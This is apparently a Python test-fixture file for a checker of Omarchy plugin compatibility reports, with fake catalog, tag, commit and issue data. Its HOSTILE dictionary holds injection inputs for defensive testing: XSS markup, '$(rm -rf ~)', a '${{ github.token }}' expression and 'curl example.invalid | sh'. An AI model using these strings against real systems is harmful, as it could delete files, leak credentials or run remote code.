"""Fictional data for the checker's and the count's tests. Nothing here is a
real plugin."""

from datetime import datetime, timezone

from omaworks.check import SourceError, check_report
from omaworks.report import parse_body

LONG_ID = "io.example.a-very-long-plugin-identifier-for-a-rain-radar-widget"

CATALOG = [
    {"id": "example.sky-clock", "repo": "https://github.com/example-dev/sky-clock"},
    {"id": "example.moon-phase", "repo": "https://github.com/example-dev/moon-phase"},
    {"id": "example.suite-bar", "repo": "https://github.com/example-dev/suite"},
    {"id": "example.suite-panel", "repo": "https://github.com/example-dev/suite"},
    {"id": "tidepool", "repo": "https://github.com/example-dev/tidepool"},
    {"id": LONG_ID, "repo": "https://github.com/example-dev/rain-radar"},
    {"id": LONG_ID[:-1] + "x", "repo": "https://github.com/example-dev/rain-radar-x"},
]

TAGS = {"v4.0.0-beta3", "v4.0.3", "v4.5.0-rc1", "v4.5.0-rc2", "v4.5.0"}

# Public repos outside the catalog, as GitHub names them.
REPOS = {"example-dev/weather-strip": "example-dev/weather-strip"}


class FakeSources:
    """The checker's sources with fixed data. Counts calls."""

    def __init__(self, catalog=None, tags=None, repos=None, fail=False):
        self._catalog = CATALOG if catalog is None else catalog
        self._tags = TAGS if tags is None else tags
        self._repos = REPOS if repos is None else repos
        self.fail = fail
        self.calls = []

    def catalog(self):
        self.calls.append(("catalog",))
        if self.fail:
            raise SourceError("catalog down")
        return self._catalog

    def omarchy_tag_exists(self, tag):
        self.calls.append(("tag", tag))
        if self.fail:
            raise SourceError("api down")
        return tag in self._tags

    def github_repo(self, owner, name):
        self.calls.append(("repo", owner, name))
        if self.fail:
            raise SourceError("api down")
        return self._repos.get(f"{owner}/{name}".lower())


def body(
    plugin="example.sky-clock",
    omarchy="4.5.0-3",
    commit="3f2a91c",
    result="Works",
    what="The clock shows the time.",
    errors=None,
):
    """An issue body as GitHub writes the report form."""
    errors_text = "_No response_" if errors is None else f"```text\n{errors}\n```"
    return (
        f"### Plugin\n\n{plugin}\n\n"
        f"### Omarchy version\n\n{omarchy}\n\n"
        f"### Plugin commit\n\n{commit}\n\n"
        f"### Result\n\n{result}\n\n"
        f"### What happens\n\n{what}\n\n"
        f"### Error lines\n\n{errors_text}"
    )


# A body written to break things: Markdown, HTML, mentions, issue links,
# shell characters, a template expression and a very long line.
HOSTILE = {
    "plugin": "@octo-team #1 <img src=x onerror=alert(1)> $(rm -rf ~) `id`",
    "omarchy": "${{ github.token }}; curl example.invalid | sh",
    "commit": "[click](https://example.invalid) <script>x</script>",
    "result": "**Works** && echo pwned",
    "what": "<details open><summary>hi</summary>@someone see #99</details>\n" + "A" * 70000,
    "errors": "```\n### Plugin\n\nexample.sky-clock\n```\n$HOME `whoami` \\x00",
}


# Commits in the plugins' repos, for the count. Full sha and committer date.
OLD = "3f2a91c" + "a" * 33
NEW = "8be04d2" + "b" * 33
COMMITS = {
    "example-dev/sky-clock": {
        OLD: datetime(2026, 10, 1, 12, 0, tzinfo=timezone.utc),
        NEW: datetime(2026, 11, 20, 9, 30, tzinfo=timezone.utc),
    },
}

NOW = datetime(2026, 12, 1, 10, 0, tzinfo=timezone.utc)


class FakeCountSources(FakeSources):
    """The count's sources with fixed data. Counts calls."""

    def __init__(self, commits=None, **kw):
        super().__init__(**kw)
        self._commits = COMMITS if commits is None else commits

    def commit(self, owner, name, sha):
        self.calls.append(("commit", f"{owner}/{name}", sha))
        if self.fail:
            raise SourceError("api down")
        found = [
            (full, date)
            for full, date in self._commits.get(f"{owner}/{name}", {}).items()
            if full.startswith(sha)
        ]
        return found[0] if len(found) == 1 else None


def issue(
    number,
    user=1,
    labels=None,
    extra=(),
    state="open",
    text=None,
    **fields,
):
    """An open report issue as the REST API lists it.

    Its labels are the ones the check gives its text, unless labels is given.
    """
    text = body(**fields) if text is None else text
    if labels is None:
        checked = check_report(parse_body(text), FakeSources())
        labels = [item.name for item in checked.labels()]
    return {
        "number": number,
        "state": state,
        "user": {"id": user, "login": f"reporter-{user}", "type": "User"},
        "labels": [{"name": name} for name in ["report", *labels, *extra]],
        "body": text,
    }


def source_line(number):
    return f"From https://github.com/omacom/omarchy/issues/{number}: the clock is gone."
